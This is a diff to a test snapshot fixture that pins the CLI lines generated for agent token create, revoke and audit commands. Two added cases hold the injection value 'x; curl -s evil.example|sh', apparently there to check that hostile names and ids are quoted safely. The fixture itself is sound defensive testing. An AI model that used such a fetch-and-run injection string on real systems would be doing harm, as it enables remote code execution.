@@ -2,6 +2,10 @@
   "about": "Every line the browser's twin modules print, for the inputs in ui/shared/src/test/cliTwins.test.ts. core/cmd/retnd's TestEveryUITwinParses runs each through the dispatcher and checks the sources below still hash the same. Re-pin with: npx vitest run -u src/test/cliTwins.test.ts (from ui/shared)",
   "sources": [
     {
+      "path": "ui/shared/src/agents/agentCommands.ts",
+      "sha256": "671ae507ab52b300893cdb92726c81ddb5090524498d92d8f1f91e9e2869dd18"
+    },
+    {
       "path": "ui/shared/src/assurance/assuranceCommands.ts",
       "sha256": "6427846445035d39e5c8569016d86e56151e224bb5b734fad2a6fa2b6a1927c2"
     },
@@ -31,10 +35,52 @@
     },
     {
       "path": "ui/shared/src/test/cliTwins.test.ts",
-      "sha256": "842437fd86d4847ff42675af89336cad8d8f290b338a915133e5882e596006c8"
+      "sha256": "5ad070c8fe369bf04039b2e71f465a3774d330b293da8a9e9bc43c7d45b718f6"
     }
   ],
   "twins": [
+    {
+      "module": "agents/agentCommands",
+      "fn": "mintCommand",
+      "case": "a name alone",
+      "line": "retnd agent token create nightly-triage"
+    },
+    {
+      "module": "agents/agentCommands",
+      "fn": "mintCommand",
+      "case": "every flag",
+      "line": "retnd agent token create nightly-triage --scope operate --expires-in 720h"
+    },
+    {
+      "module": "agents/agentCommands",
+      "fn": "mintCommand",
+      "case": "a hostile name",
+      "line": "retnd agent token create 'x; curl -s evil.example|sh' --scope read"
+    },
+    {
+      "module": "agents/agentCommands",
+      "fn": "revokeCommand",
+      "case": "one token",
+      "line": "retnd agent token revoke agt_0123456789abcdef"
+    },
+    {
+      "module": "agents/agentCommands",
+      "fn": "revokeCommand",
+      "case": "a hostile id",
+      "line": "retnd agent token revoke 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "agents/agentCommands",
+      "fn": "auditCommand",
+      "case": "the whole trail",
+      "line": "retnd agent audit"
+    },
+    {
+      "module": "agents/agentCommands",
+      "fn": "auditCommand",
+      "case": "one token since a week",
+      "line": "retnd agent audit --token agt_0123456789abcdef --since 7d"
+    },
     {
       "module": "assurance/assuranceCommands",
       "fn": "scrubCommand",
